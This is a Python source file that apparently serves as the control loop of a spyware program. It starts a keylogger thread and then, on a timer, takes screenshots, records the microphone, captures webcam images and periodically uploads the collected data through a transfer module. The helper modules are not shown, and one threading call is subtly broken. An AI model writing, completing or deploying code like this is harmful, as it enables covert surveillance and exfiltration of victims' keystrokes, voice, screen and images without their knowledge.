import time
import threading
import getpass


# property indicate if user is now operating with the computer
import transferProvider, voiceSniffer, screenMonitor, webcamSnapper, keyLogger

# is_active = False
program_running = True
user_name = getpass.getuser()


last_mouse_x = 0
last_mouse_y = 0


def upload_data():
    print("Uploading data!")
    tp = transferProvider.TransferProvider()
    tp.establish_connection()


def record_voice(duration: int = 60):
    # record voice for 60 seconds if user is active
    print("Voice recording")
    voiceSniffer.start_rec(duration)


def take_screenshot():
    print("Taken screenshot")
    # if is_active:
    screenMonitor.save_screenshot()


def take_webcamshot():
    print("Taking photos trough webcam")
    webcamSnapper.take_capture_and_save()


def stop():
    global program_running
    program_running = False


def start_recording():
    global program_running
    x = threading.Thread(target=keyLogger.start_logging(), daemon=True)
    x.start()

    counter = 0
    while program_running:
        counter += 1
        if counter % (60*3) == 0:
            # schedule.every(3).minutes.do(take_screenshot)
            take_screenshot()
        if counter % (60*5) == 0:
            # schedule.every(5).minutes.do(record_voice)
            record_voice()
        if counter % (60 * 10) == 0:
            # schedule.every(10).minutes.do(take_webcamshot)
            take_webcamshot()
        if counter % (60 * 20) == 0:
            # schedule.every(20).minutes.do(upload_data)
            upload_data()

        if counter > 6000:
            counter = 0
        time.sleep(1)